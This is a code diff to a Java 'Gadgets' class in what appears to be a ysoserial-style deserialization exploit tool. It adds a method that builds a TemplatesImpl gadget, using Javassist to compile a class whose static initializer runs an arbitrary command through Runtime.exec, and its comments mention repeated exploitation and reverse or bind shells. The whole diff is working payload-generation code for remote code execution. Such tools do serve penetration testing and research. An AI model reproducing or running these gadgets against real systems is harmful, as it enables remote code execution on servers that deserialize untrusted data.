@@ -9,6 +9,8 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.Map;
+
+import com.template.Foo;
 import com.h2tg.ysogate.config.Config;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
@@ -69,12 +71,6 @@ public class Gadgets {
 
         @Override
         public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
-    }
-
-    // required to make TemplatesImpl happy
-    public static class Foo implements Serializable {
-
-        private static final long serialVersionUID = 8207363842866235160L;
     }
 
 
@@ -151,7 +147,7 @@ public class Gadgets {
                 "\");";
         clazz.makeClassInitializer().insertAfter(cmd);
         // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-        clazz.setName("ysogate.Pwner" + System.nanoTime());
+        clazz.setName("yso.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
 
@@ -168,6 +164,36 @@ public class Gadgets {
         return templates;
     }
 
+
+    public static <T> T createTemplatesImplWithFoo ( final String command)
+            throws Exception {
+        final T templates = (T) TemplatesImpl.class.newInstance();
+
+        // use template gadget class
+        ClassPool pool = ClassPool.getDefault();
+        final CtClass clazz = pool.makeClass("temp.Dummy");
+        // run command in static initializer
+        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replace("\\", "\\\\").replace("\"", "\\\"") +
+                "\");";
+        clazz.makeClassInitializer().insertAfter(cmd);
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName("yso.Pwner" + System.nanoTime());
+
+        final byte[] classBytes = clazz.toBytecode();
+
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+                classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_transletIndex", 0);
+        Reflections.setFieldValue(templates, "_tfactory", TransformerFactoryImpl.class.newInstance());
+        return templates;
+    }
 
 //    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
 //            IllegalAccessException, InvocationTargetException {
